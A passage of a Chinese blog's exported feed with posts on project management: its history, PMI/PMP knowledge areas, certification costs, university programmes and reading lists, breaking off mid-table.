<h4 id="10-2-Flow-Chart-Sequence"><a href="#10-2-Flow-Chart-Sequence" class="headerlink" title="10.2 Flow Chart Sequence"></a>10.2 Flow Chart Sequence</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">participant 自然 as N</span><br><span class="line"></span><br><span class="line">participant 科学 as S</span><br><span class="line"></span><br><span class="line">participant 商业 as B</span><br><span class="line"></span><br><span class="line">participant 工程 as E</span><br><span class="line"></span><br><span class="line">participant 教育 as ED</span><br><span class="line"></span><br><span class="line">participant 法律 as L</span><br><span class="line"></span><br><span class="line">participant 公共 as P</span><br><span class="line"></span><br><span class="line">participant 社会 as S</span><br><span class="line"></span><br><span class="line">B-&gt;E:项目管理</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="拓展阅读"><a href="#拓展阅读" class="headerlink" title="拓展阅读"></a>拓展阅读</h4><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://jvns.ca/blog/2018/09/01/learning-skills-you-can-practice/">How to teach yourself hard things</a></li>
<li><a href="https://hackernoon.com/just-in-case-vs-just-in-time-learning-c87f61d24360?ref=hackingrevenue">Just-In-Case vs. Just-In-Time Learning</a></li>
<li><a href="https://www.quantamagazine.org/brain-computer-interfaces-show-that-neural-networks-learn-by-recycling-20180327/">Brains Cling to Old Habits When Learning New Tricks</a></li>
<li><a href="https://medium.com/@andyferris/the-uncertainty-tax-the-financial-cost-of-not-knowing-things-2de05a5d21f6">The Uncertainty Tax: the financial cost of not knowing things</a></li>
<li><a href="https://mp.weixin.qq.com/s/sZAX63JEjjlr5Zsw9eOK4Q">专业主义，从备忘录开始 | 原创： 阳志平  心智工具箱  2018-05-10</a></li>
<li><a href="http://lsc.cornell.edu/notes.html?utm_source=wanqu.co&amp;utm_campaign=Wanqu+Daily&amp;utm_medium=website">康奈尔笔记法 | The Cornell Note-taking System</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>工具癖</tag>
      </tags>
  </entry>
  <entry>
    <title>项目管理 | Overview of Project Management</title>
    <url>/2019/02/06/Project/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><span id="more"></span>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h2 id="问题：手艺人需要管理吗？"><a href="#问题：手艺人需要管理吗？" class="headerlink" title="问题：手艺人需要管理吗？"></a>问题：手艺人需要管理吗？</h2><ul>
<li>构思中，项目管理的起源和早期历史</li>
</ul>
<h2 id="建筑业：从工匠师傅到营造师"><a href="#建筑业：从工匠师傅到营造师" class="headerlink" title="建筑业：从工匠师傅到营造师"></a>建筑业：从工匠师傅到营造师</h2><p>现代意义的建筑师出现在欧洲，最早的建筑师就是总营造师，也成建筑师傅。</p>
<p>建筑师负责设计、购买材料、雇佣工匠，并管理工程施工。16世纪至18世纪中期，欧洲兴起华丽的花型建筑热潮，在建筑师队伍中开始形成了分工，一部分建筑师联合起来专注于进行设计，另一部分建筑师则负责组织、监督施工，也就逐步形成了设计和施工的分离。</p>
<ul>
<li><p>营造师（Master Builder）：作为建筑项目的最高领导者，营造师必须负责跟进整个工程项目。</p>
</li>
<li><p>建造师（Constructor）：起源于英国，负责全面的组织管理，以工程项目施工管理为主业，通常为项目经理或相关负责人。中国建造师分为一级注册建造师（Constructor）和二级注册建造师（Associate Constructor）。</p>
</li>
</ul>
<h2 id="军事工业：现代项目管理的发祥地"><a href="#军事工业：现代项目管理的发祥地" class="headerlink" title="军事工业：现代项目管理的发祥地"></a>军事工业：现代项目管理的发祥地</h2><p>项目管理最早起源于美国，是二次世界大战后发展起来的管理技术之一。</p>
<p>关键路径法（CPM）是由美国杜邦公司和兰德公司与1957年联合研究提出的，它假设每项活动的作业时间是确定值，重点在于费用和成本的控制。</p>
<p>项目评估与审查技术（Project Evaluation and Review Technique,PERT）由美国海军首次提出，并于1958年由 Booz、Allen 和 Hamilton 的咨询公司开发。最早的用途是协调在核潜艇发射的“北极星”导弹研发计划，该项目包括 10 000 多个分包商的活动。</p>
<p>PERT 类似关键路径方法(CPM)，是一种用于优化和调度复杂的、相关关联的活动的方法。但是与CPM不同的是，PERT中作业时间是不确定的，采用概率估算，它的重点在于时间控制，并不十分关心项目费用和成本。由此可知，彼时美国海军特种计划局的预算一定非常充足。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/%E5%8C%97%E6%9E%81%E6%98%9F%E5%AF%BC%E5%BC%B9_2426.jpg" alt=""></p>
<h2 id="软件业：人月神话为什么不灵了"><a href="#软件业：人月神话为什么不灵了" class="headerlink" title="软件业：人月神话为什么不灵了"></a>软件业：人月神话为什么不灵了</h2><h2 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h2><p>项目管理的未来发展趋势是什么？英国UCL大学、APM（英国项目管理协会）和全球著名工程咨询公司奥雅纳（ARUP）对此开展了联合研究，发布了《Future of Project Management（项目管理的未来）》研究报告。几个重要节点包括（英国视角）：</p>
<p>1990年前后：奥雅纳发起了项目管理业务；互联网引入<br>1995年前后：CCTA发布了Priince2标准<br>2000年前后：PMBOK发布成为标准；“敏捷项目管理”提出<br>2005年前后：希思罗机场开始运行<br>2010年前后：项目管理作为五大需求技能之一；伦敦奥运会举办<br>2015年前后：移动设备和链接数量超过地球上总人口数量；APM成为英国皇家特许项目职业体系<br>2020年前后：资源危机；项目数据的区块链涌现<br>2025年前后：社会责任成为PMBOK的一章；每秒1TB的光纤开始安装<br>2030年前后：世界100强公司在高层管理层都设有项目管理专业人士<br>2035年前后：项目管理成为英国国家课程的一部分；神经技术（Neuro-technologies）普及<br>2040年前后：智能算法超过专家判断<br>2045年前后：虚拟心灵感应主宰个人沟通</p>
<h2 id="PMI-知识体系"><a href="#PMI-知识体系" class="headerlink" title="PMI 知识体系"></a>PMI 知识体系</h2><p>美国项目管理协会（Project Management Institute，简写 PMI）成立于1969年，是一个由项目管理专业领域内的研究人员、学者、顾问和经理组成的全球性的专业组织机构。由 PMI 组织编写的《项目管理知识体系指南》在项目管理领域影响深远。</p>
<p>PMI 认为在实际的项目管理中，项目管理存在三重制约（triple constraint），各要素的优先权各有不同。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>S 范围</td>
<td>S 范围</td>
</tr>
<tr>
<td>T 时间</td>
<td>T 时间</td>
</tr>
<tr>
<td>Q 质量</td>
<td>Q 质量</td>
</tr>
<tr>
<td>C 成本</td>
<td>C 费用</td>
</tr>
<tr>
<td></td>
<td>R 资源</td>
</tr>
<tr>
<td></td>
<td>R 风险</td>
</tr>
</tbody>
</table>
</div>
<p>关于项目管理生命周期,PMI 提出了五大过程组(Project Management Process Groups)的概念:</p>
<ul>
<li>启动过程组 | Initiating Process Group</li>
<li>规划过程组 | Planning Process Group</li>
<li>执行过程组 | Executing Process Group</li>
<li>监控过程组 | Monitoring and Controlling Process Group</li>
<li>收尾过程组 | Closing Process Group</li>
</ul>
<h4 id="项目范围管理-Project-Scope-Management"><a href="#项目范围管理-Project-Scope-Management" class="headerlink" title="项目范围管理 | Project Scope Management"></a>项目范围管理 | Project Scope Management</h4><p><img src="https://cdn-images-1.medium.com/max/1600/0*SFC4KTI9iaFTzwOM.jpg" alt=""></p>
<h4 id="项目进度管理-Project-Schedule-Management"><a href="#项目进度管理-Project-Schedule-Management" class="headerlink" title="项目进度管理 | Project Schedule Management"></a>项目进度管理 | Project Schedule Management</h4><h4 id="项目成本管理-Project-Cost-Management"><a href="#项目成本管理-Project-Cost-Management" class="headerlink" title="项目成本管理 | Project Cost Management"></a>项目成本管理 | Project Cost Management</h4><h4 id="项目质量管理-Project-Quality-Management"><a href="#项目质量管理-Project-Quality-Management" class="headerlink" title="项目质量管理 | Project Quality Management"></a>项目质量管理 | Project Quality Management</h4><h4 id="项目资源管理-Project-Resource-Management"><a href="#项目资源管理-Project-Resource-Management" class="headerlink" title="项目资源管理 | Project Resource Management"></a>项目资源管理 | Project Resource Management</h4><h4 id="项目沟通管理-Project-Communications-Management"><a href="#项目沟通管理-Project-Communications-Management" class="headerlink" title="项目沟通管理 | Project Communications Management"></a>项目沟通管理 | Project Communications Management</h4><h4 id="项目风险管理-Project-Risk-Management"><a href="#项目风险管理-Project-Risk-Management" class="headerlink" title="项目风险管理 | Project Risk Management"></a>项目风险管理 | Project Risk Management</h4><h4 id="项目采购管理-Project-Procurement-Management"><a href="#项目采购管理-Project-Procurement-Management" class="headerlink" title="项目采购管理 | Project Procurement Management"></a>项目采购管理 | Project Procurement Management</h4><h4 id="项目相关方管理-Project-Stakeholder-Management"><a href="#项目相关方管理-Project-Stakeholder-Management" class="headerlink" title="项目相关方管理 | Project Stakeholder Management"></a>项目相关方管理 | Project Stakeholder Management</h4><h2 id="Beyond-the-Project"><a href="#Beyond-the-Project" class="headerlink" title="Beyond the Project"></a>Beyond the Project</h2><h3 id="Level-1-PMP-IPMP"><a href="#Level-1-PMP-IPMP" class="headerlink" title="Level 1. PMP/IPMP"></a>Level 1. PMP/IPMP</h3><ul>
<li><p><a href="https://www.pmi.org/">美国项目管理协会 | Project Management Institute, Inc.</a></p>
</li>
<li><p>费用预算</p>
</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>套餐</th>
<th>PMI/PMP</th>
<th>其它</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>自学</td>
<td>￥3900</td>
<td>-</td>
<td>考试时间:09:00~13:00</td>
</tr>
<tr>
<td>培训</td>
<td>￥3900</td>
<td>￥3800</td>
<td>备考周期：3-4个月</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>推荐供应商</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>供应商</th>
<th>授课形式</th>
<th>周期</th>
<th>授课地点</th>
<th>师资</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://www.gdpms.org/">广东省项目管理学会</a></td>
<td>广州、深圳</td>
<td>3-4个月</td>
<td>广州（广东邮电职业技术学院）</td>
<td>中山大学管理学院</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Level-2-Master-of-Engineering"><a href="#Level-2-Master-of-Engineering" class="headerlink" title="Level 2. Master of    Engineering"></a>Level 2. Master of    Engineering</h3><h4 id="同济大学：经济与管理学院"><a href="#同济大学：经济与管理学院" class="headerlink" title="同济大学：经济与管理学院"></a>同济大学：经济与管理学院</h4><ul>
<li>渊源：建筑工程、建筑与房地产系</li>
<li>流派：皇家特许建造学会（CIOB）、美国项目管理协会（PMI）</li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">《工程项目管理》公开课 | MOOC网 | 学习强国App</a></li>
<li>同济大学工程管理研究所 | 丁士昭、陈建国</li>
<li>同济大学复杂工程管理研究院 | 丁士昭、乐云 | <a href="http://www.mpcsc.org/">重大工程案例研究和数据中心</a></li>
<li>公众号：“复杂工程视点”</li>
</ul>
<h4 id="天津大学：管理与经济学部"><a href="#天津大学：管理与经济学部" class="headerlink" title="天津大学：管理与经济学部"></a>天津大学：管理与经济学部</h4><ul>
<li>渊源：铁路工程、机械工程、化学工程</li>
<li><a href="http://come.tju.edu.cn/">天津大学管理与经济学部</a></li>
<li>公众号：“全球工程运营”</li>
<li>关注：海外工程、FIDIC、PPP</li>
</ul>
<h3 id="Level-3-Beyond"><a href="#Level-3-Beyond" class="headerlink" title="Level 3. Beyond"></a>Level 3. Beyond</h3><h4 id="Megaproject"><a href="#Megaproject" class="headerlink" title="Megaproject"></a>Megaproject</h4><ul>
<li><p><a href="http://www.mpcsc.org/infonews.htm?id=2547">《The Oxford Handbook of Megaproject Management》（重大工程管理牛津指南）</a><br>主编:牛津大学赛德商学院教授 Bent Flyvbjerg。了解更多<a href="https://mp.weixin.qq.com/s/yxrc6goVQYli8PEXgrd9tw">&gt;&gt;&gt;&gt;&gt;《重大工程管理牛津指》简介</a>。</p>
</li>
<li><p><img src="http://riboseyim-qiniu.riboseyim.com/The%20Oxford%20Handbook%20of%20Megaproject.png" alt=""></p>
</li>
<li><p><a href="#">《The Anatomy of Major Projects》（重大项目剖析）</a>：剖析了英国一系列的重大项目，例如英法海底隧道等，该书聚焦于应用的实用性，将自身风格定位为“项目管理现实的研究”（study of the reality of project management），所提出的巨型项目十亿美元的基准被广为采用。</p>
</li>
<li><p><a href="#">《Industrial Megaprojects》（工业巨型项目）</a>：从业主视角强调商业决策制定及项目决策，因此读者对象主要是业主而非学术界。该书具有318个项目的数据，主要是石化、石油以及电站、管道等项目类型，但这些数据并没有经过第三方评审。</p>
</li>
<li><p><a href="#">《Megaprojects and Risk: An Anatomy of Ambition》（巨型项目和风险：一个雄心的剖析）</a>：对巨型项目及风险进行了详细的分析，主要采用了案例分析方法，包括英法隧道、大贝尔桥等，同时也采用了美国和欧洲等地方的基础设施数据。该书认为，由于没有充分考虑风险以及低水平的风险管理，再加上缺乏问责制，产生了“评价乐观主义”的不良环境，这导致了不准确的估计，进而引发高失败率和大规模成本超支。</p>
</li>
</ul>
<h2 id="项目管理专题"><a href="#项目管理专题" class="headerlink" title="项目管理专题"></a>项目管理专题</h2><ul>
<li><a href="https://riboseyim.com/2019/02/06/Project/">项目管理 | Overview of Project Management</a></li>
<li><a href="https://riboseyim.com/2019/04/30/Project-PMP/">PM指南:PMI项目管理知识体系</a></li>
<li><a href="https://riboseyim.com/2019/03/27/Project-Construction/">PM指南:建筑工程项目管理|行业案例教学</a></li>
<li><a href="#">PM指南:范围管理</a></li>
<li><a href="#">PM指南:进度管理</a></li>
<li><a href="#">PM指南:成本管理</a></li>
<li><a href="#">PM指南:质量管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Resources/">PM指南:资源管理</a></li>
<li><a href="https://riboseyim.com/2019/02/06/Project-Communications/">PM指南:沟通管理</a></li>
<li><a href="https://riboseyim.github.io/2018/06/05/Project-Risk/">PM指南:风险管理</a></li>
<li><a href="https://riboseyim.github.io/2019/03/12/Project-Procurement/">PM指南:采购管理</a></li>
<li><a href="#">PM指南:相关方管理</a></li>
<li><a href="https://riboseyim.com/2019/05/29/Project-Tech-NetworkPlanning/">PM指南:网络计划技术|工具与技术</a></li>
<li><a href="https://riboseyim.com/2019/04/06/Project-PMIS/">PM指南:项目管理信息系统|工具与技术</a></li>
<li><a href="https://riboseyim.com/2018/06/19/Project-Template/">PM指南:项目管理开局模板|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/04/26/TeamWork-Redmine/">PM指南:开源项目管理平台Redmine|工具与技术</a></li>
<li><a href="https://riboseyim.com/2017/08/06/TeamWork-Kanban/">PM指南:软件业看板Kanban管理实践|工具与技术</a></li>
<li><a href="https://riboseyim.com/2016/05/31/TeamWork-Git/">PM指南:源代码版本管理|工具与技术</a></li>
</ul>
<h4 id="案例教学"><a href="#案例教学" class="headerlink" title="案例教学"></a>案例教学</h4><ul>
<li><a href="https://riboseyim.com/2019/02/04/Engineering-Ethics/">挑战者号航天飞机事故调查|案例</a></li>
<li><a href="https://riboseyim.com/2016/11/20/Network-Traffic/">珠海航展交通管控实践|案例</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/yJUJ3WHExJzaFw7VWaghFg">项目管理未来：通往2045年之路 |华军辉  复杂工程视点 2019年4月3日</a></li>
<li><a href="https://mp.weixin.qq.com/s/gMk7YZ2en6tFVSlaUq2LKg">重大工程管理三大经典著作的比较、评价和分析 | 原创： MPCSC  复杂工程视点  2017-01-30</a></li>
<li><a href="https://medium.com/@sachinrekhi/modern-project-management-for-product-managers-b8e85fb15a95">Modern Project Management for Product Managers</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Engineering</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>PM指南:项目管理知识体系</title>
    <url>/2019/04/30/Project-PMP/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>PMI 项目管理知识体系</li>
</ul>
<span id="more"></span>
<p>美国项目管理协会（Project Management Institute，简写 PMI）成立于1969年，是一个由项目管理专业领域内的研究人员、学者、顾问和经理组成的全球性的专业组织机构。PMP(Project Management Professional)是该协会推出的资格认证。</p>
<h2 id="引论-Introduction"><a href="#引论-Introduction" class="headerlink" title="引论 | Introduction"></a>引论 | Introduction</h2><h4 id="项目的三重制约（triple-constraint）"><a href="#项目的三重制约（triple-constraint）" class="headerlink" title="项目的三重制约（triple constraint）"></a>项目的三重制约（triple constraint）</h4><p>在实际的项目管理中，三重制约各要素的优先权不同。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>S 范围</td>
<td>S 范围</td>
</tr>
<tr>
<td>T 时间</td>
<td>T 时间</td>
</tr>
<tr>
<td>Q 质量</td>
<td>Q 质量</td>
</tr>
<tr>
<td>C 成本</td>
<td>C 费用</td>
</tr>
<tr>
<td></td>
<td>R 资源</td>
</tr>
<tr>
<td></td>
<td>R 风险</td>
</tr>
</tbody>
</table>
</div>
<h4 id="目标管理（MBO-Management-by-Objectives）"><a href="#目标管理（MBO-Management-by-Objectives）" class="headerlink" title="目标管理（MBO,Management by Objectives）"></a>目标管理（MBO,Management by Objectives）</h4><p>实施目标管理的三个步骤：</p>
<p>1）树立目标（SMART）</p>
<ul>
<li>具体的 Specific</li>
<li>可衡量的 Measurable</li>
<li>可达到的 Achievable</li>
<li>现实的 Realistic</li>
<li>基于时间的 Timebased</li>
</ul>
<p>2）定期评估目标可否达到<br>3）采取修正措施</p>
<h4 id="项目管理环境"><a href="#项目管理环境" class="headerlink" title="项目管理环境"></a>项目管理环境</h4><ul>
<li>项目组合 Portfolios : 战略业务目标，相互无关</li>
<li>项目集 Programs : 相互关联</li>
<li>项目 Project</li>
</ul>
<ul>
<li>组织级项目管理（OPM）</li>
</ul>
<h4 id="项目管理逻辑过程"><a href="#项目管理逻辑过程" class="headerlink" title="项目管理逻辑过程"></a>项目管理逻辑过程</h4><p>项目管理逻辑过程（ITTO）:</p>
<ul>
<li>输入 Input</li>
<li>工具与技术 Tool &amp; Technology</li>
<li>输出 Output</li>
</ul>
<h4 id="项目管理生命周期"><a href="#项目管理生命周期" class="headerlink" title="项目管理生命周期"></a>项目管理生命周期</h4><p>五大项目管理过程组：启动、规划、执行、监控、收尾。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">digraph process&#123;</span><br><span class="line">   Initiating-&gt;Planning;</span><br><span class="line">   Planning-&gt;Executing;</span><br><span class="line">   Controlling-&gt;Planning;</span><br><span class="line">   Controlling-&gt;Executing;</span><br><span class="line">   Executing-&gt;Controlling;</span><br><span class="line">   Controlling-&gt;Closing;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>项目管理过程组 | Project Management Process Groups</p>
<ul>
<li>启动过程组 | Initiating Process Group</li>
<li>规划过程组 | Planning Process Group</li>
<li>执行过程组 | Executing Process Group</li>
<li>监控过程组 | Monitoring and Controlling Process Group</li>
<li>收尾过程组 | Closing Process Group</li>
</ul>
<h4 id="PMP-知识框架"><a href="#PMP-知识框架" class="headerlink" title="PMP 知识框架"></a>PMP 知识框架</h4><div class="table-container">
<table>
<thead>
<tr>
<th>知识领域</th>
<th>启动过程组</th>
<th>规划过程组</th>
<th>执行过程组</th>
<th>监控过程组</th>
<th>收尾过程组</th>
</tr>
</thead>
<tbody>
<tr>
<td>4. 项目整合管理</td>
<td>4.1 制定项目章程</td>
<td>4.2 制定项目管理计划</td>
<td>4.3 指导与管理项目工作 <br> 4.4 管理项目知识</td>
<td>4.5 监控项目工作 <br> 4.6 实施整体变更控制</td>
<td>4.7 结束项目或阶段</td>
</tr>
<tr>
<td>5. 项目范围管理</td>
<td></td>
<td>5.1 规划范围管理 <br> 5.2 收集需求 <br> 5.3 定义范围 <br> 5.4 创建WBS</td>
<td></td>
<td>5.5 确认范围 <br> 5.6 控制范围</td>
<td></td>
</tr>
<tr>
<td>6. 项目进度管理</td>
<td></td>
<td>6.1 规划进度管理 <br> 6.2 定义活动  <br> 6.3 排列活动顺序 <br>  6.4 估算活动持续时间  <br> 6.5 制定进度计划</td>
<td></td>
<td>6.5 控制进度</td>
<td></td>
</tr>
<tr>
<td>7. 项目成本管理</td>
<td></td>
<td>7.1 规划成本管理 <br>  7.2 估算成本 <br>  7.3 制定预算</td>
<td></td>
<td>7.4 控制成本</td>
<td></td>
</tr>
<tr>
<td>8. 项目质量管理</td>
<td></td>
<td>8.1 规划质量管理</td>
<td>8.2 管理质量  <br></td>
<td>8.3 控制质量</td>
<td></td>
</tr>
<tr>
<td>9. 项目资源管理</td>
<td></td>
<td>9.1 规划资源管理  <br> 9.2 估算活动资源</td>
<td>9.3 获取资源 <br>  9.4 建设团队  <br> 9.5 管理团队</td>
<td>9.6 控制资源</td>
<td></td>
</tr>
<tr>
<td>10. 项目沟通管理</td>
<td></td>
<td>10.1 规划沟通管理</td>
<td>10.2 管理沟通</td>
<td>10.3 监督沟通</td>
<td></td>
</tr>
<tr>
<td>11. 项目风险管理</td>
<td></td>
<td>11.1 规划风险管理 <br>  11.2 识别风险  <br> 11.3 实施定性风险分析  <br> 11.4 实施定量风险分析  <br>  11.5 规划风险应对</td>
<td>11.6 实施风险应对</td>
<td>11.7 监督风险</td>
<td></td>
</tr>
<tr>
<td>12. 项目采购管理</td>
<td></td>
<td>12.1 规划采购管理</td>
<td>12.2 实施采购</td>
<td>12.3 控制采购</td>
<td></td>
</tr>
<tr>
<td>13. 项目相关方管理</td>
<td>13.1 识别相关方</td>
<td>13.2 规划相关方参与</td>
<td>13.3 管理相关方参与</td>
<td>13.4 监督相关方参与</td>
</tr>
</tbody>
</table>
</div>
<h4 id="变更控制系统"><a href="#变更控制系统" class="headerlink" title="变更控制系统"></a>变更控制系统</h4><p>PMIS -&gt; 配置管理 -&gt; 变更控制</p>
<p>变更控制系统是配置管理系统的一个子系统，包括：</p>
<ul>
<li>一份变更控制计划：包括在项目管理计划中。</li>
<li>组建 <strong>变更控制委员会（CCB，change control board）</strong> 批准所有的变更</li>
<li>变更控制流程（如何控制，谁负责）</li>
<li>变更表格 Change forms</li>
<li>报告Reports(里程碑图表，资源使用量)</li>
<li>绩效统计值</li>
</ul>
<h4 id="项目成功"><a href="#项目成功" class="headerlink" title="项目成功"></a>项目成功</h4><p>项目成功的判断标准：</p>
<ul>
<li>按基准完成</li>
<li>在容忍范围内完成</li>
</ul>
<h2 id="项目运行环境-The-Environment-in-which-Projects-Operate"><a href="#项目运行环境-The-Environment-in-which-Projects-Operate" class="headerlink" title="项目运行环境 | The Environment in which Projects Operate"></a>项目运行环境 | The Environment in which Projects Operate</h2><h4 id="事业环境因素-Enterprise-Environment-Factors"><a href="#事业环境因素-Enterprise-Environment-Factors" class="headerlink" title="事业环境因素 | Enterprise Environment Factors"></a>事业环境因素 | Enterprise Environment Factors</h4><h4 id="组织过程资产-Organizational-Process-Assets"><a href="#组织过程资产-Organizational-Process-Assets" class="headerlink" title="组织过程资产 | Organizational Process Assets"></a>组织过程资产 | Organizational Process Assets</h4><h4 id="组织结构类型"><a href="#组织结构类型" class="headerlink" title="组织结构类型"></a>组织结构类型</h4><ul>
<li>智能型组织（functional organization）</li>
<li>项目型组织（projectized organization）</li>
<li><p>矩阵型组织（Matrix organization）: strong vs balanced vs weak</p>
</li>
<li><p>协调员 Coordinator (决策)</p>
</li>
<li>联络员 Expediter （不决策）</li>
</ul>
<h4 id="项目经理的角色-The-Role-of-The-Project-Manager"><a href="#项目经理的角色-The-Role-of-The-Project-Manager" class="headerlink" title="项目经理的角色 | The Role of The Project Manager"></a>项目经理的角色 | The Role of The Project Manager</h4><h2 id="项目整合管理-Project-Integration-Management"><a href="#项目整合管理-Project-Integration-Management" class="headerlink" title="项目整合管理 | Project Integration Management"></a>项目整合管理 | Project Integration Management</h2><h4 id="制定项目章程"><a href="#制定项目章程" class="headerlink" title="制定项目章程"></a>制定项目章程</h4><ul>
<li>输入：商业文件（商业论证）、协议、事业环境因素、组织过程资产</li>
<li>工具与技术：专家判断、数据收集（头脑风暴、焦点小组、访谈）、人际关系与团队技能、会议</li>
<li>输出：项目章程、假设日志</li>
</ul>
<h4 id="商业论证-Business-Case"><a href="#商业论证-Business-Case" class="headerlink" title="商业论证 Business Case"></a>商业论证 Business Case</h4><p>商业论证两大类别：</p>
<ul>
<li>【数学法】Constrained optimization methods 约束优化法</li>
<li>【比较法】Benefit measurement methods 比较利益法</li>
</ul>
<p>数学模型:</p>
<ul>
<li>线性规划 Linear programming</li>
<li>整数规划 Integer programming</li>
<li>动态规划 Dynamic programming</li>
<li>多目标规划 Multi-objective programming</li>
</ul>
<p>比较利益法：</p>
<ul>
<li>项目谋杀会议 Murder board : 末位淘汰</li>
<li>同行评审 Peer review : 权责不一致</li>
<li>评分模型 Scoring models</li>
<li>Q排序模型 Q-sort</li>
<li>经济学模型 Economic models</li>
</ul>
<h4 id="选择项目-（￥￥￥）"><a href="#选择项目-（￥￥￥）" class="headerlink" title="选择项目 （￥￥￥）"></a><strong>选择项目 （￥￥￥）</strong></h4><div class="table-container">
<table>
<thead>
<tr>
<th>指标项</th>
<th>含义</th>
<th>对项目含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>项目优先级</td>
<td>项目重要程度代表获取资源的能力</td>
<td></td>
</tr>
<tr>
<td>NPV（净现值）</td>
<td></td>
<td></td>
</tr>
<tr>
<td>IRR（内部收益率）</td>
<td></td>
<td></td>
</tr>
<tr>
<td>Payback Period（回收期）</td>
<td>收回成本所需时间</td>
<td></td>
</tr>
<tr>
<td>BCR（收益成本分析）</td>
<td>Benefit(payback) / Cost</td>
<td></td>
</tr>
<tr>
<td>ROI（投资利润率）</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SV</td>
<td>进度偏差</td>
<td>0</td>
</tr>
<tr>
<td>CV</td>
<td>成本偏差</td>
<td>0</td>
</tr>
<tr>
<td>工期绩效指数（SPI）</td>
<td>EV/PV</td>
<td>&gt;1 进度提前</td>
</tr>
<tr>
<td>成本绩效指数（CPI）</td>
<td>EV/AC</td>
<td>&gt;1 成本节约</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>PV: Present Value 现值</li>
<li>NPV: Net Present Value 净现值 ；净现值=收益现值-成本现值</li>
</ul>
<h4 id="项目章程"><a href="#项目章程" class="headerlink" title="项目章程"></a>项目章程</h4><h4 id="项目计划-（￥￥￥）"><a href="#项目计划-（￥￥￥）" class="headerlink" title="项目计划 （￥￥￥）"></a><strong>项目计划 （￥￥￥）</strong></h4><ul>
<li>基准（Baseline）<br>正式批准的项目管理计划成为基准，变更基准须提出变更请求并经实施整体变更控制过程批准。</li>
</ul>
<p>项目管理计划特点：</p>
<ul>
<li>正式 Formal</li>
<li>接受 Bought into</li>
<li>现实 Realistic</li>
<li>批准 Approved</li>
</ul>
<h4 id="项目会议"><a href="#项目会议" class="headerlink" title="项目会议"></a>项目会议</h4><ul>
<li>开工会（Kickoff Meeting）: 规划结束，执行开始；PM和项目团队</li>
<li>启动会（Initial Meeting）: 启动过程中。客户、发起人、PM</li>
</ul>
<h4 id="管理项目知识"><a href="#管理项目知识" class="headerlink" title="管理项目知识"></a>管理项目知识</h4><ul>
<li>项目文件</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>需求管理计划</td>
<td>需求文件</td>
</tr>
<tr>
<td>进度管理计划</td>
<td>项目日志（记录问题、假设条件）</td>
</tr>
<tr>
<td>成本管理计划</td>
<td>风险登记册</td>
</tr>
<tr>
<td>质量管理计划</td>
<td>项目相关方登记册</td>
</tr>
<tr>
<td>人力资源计划</td>
